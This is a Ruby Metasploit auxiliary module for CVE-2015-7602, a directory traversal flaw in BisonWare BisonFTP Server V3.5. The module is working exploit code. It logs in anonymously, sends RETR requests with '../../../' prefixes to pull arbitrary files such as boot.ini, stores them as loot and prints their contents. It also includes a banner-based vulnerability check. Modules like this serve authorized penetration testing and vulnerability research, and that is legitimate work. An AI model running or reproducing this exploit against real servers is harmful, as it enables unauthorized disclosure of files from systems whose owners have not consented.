##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'net/ftp'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Ftp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'			 => 'BisonWare BisonFTP Server Directory Traversal Information Disclosure',
      'Description'	 => %q{
        BisonWare BisonFTP server product V3.5 is vulnerable to directory traversal which allows remote
        attackers to read arbitrary files via a ..// in a RETR command.
      },
      'Platform'		 => 'win',
      'Author'		 =>
        [
          'Jay Turla <@shipcod3>' # msf and initial discovery
        ],
      'License'		 => MSF_LICENSE,
      'References'	 =>
        [
          [ 'EDB', '38341'],
          [ 'CVE', '2015-7602']
        ],
      'DisclosureDate' => 'Sep 28 2015'))

    register_options(
      [
        OptString.new('PATH', [ true, "Path to the file to disclose, releative to the root dir.", 'boot.ini'])
      ], self.class)

    deregister_options('FTPUSER', 'FTPPASS')
  end

  def check
    connect
    disconnect
    if (banner =~ /BisonWare BisonFTP server product V3.5/)
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def run_host(target_host)
    begin
      ftp = Net::FTP.new("#{datastore['RHOST']}")
      ftp.login

      path = File.join(Msf::Config.loot_directory)
      file_path = datastore['PATH']
      retr_cmd = "../../../#{file_path}"
      ftp.getbinaryfile(retr_cmd, "#{path}/test.txt", 1024)
      ftp.close

      info_disclosure = IO.read("#{path}/test.txt")
      print_status("Printing what is inside #{file_path}")
      print_good("Result:\n #{info_disclosure}")
      disconnect
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE
    end
  end
end
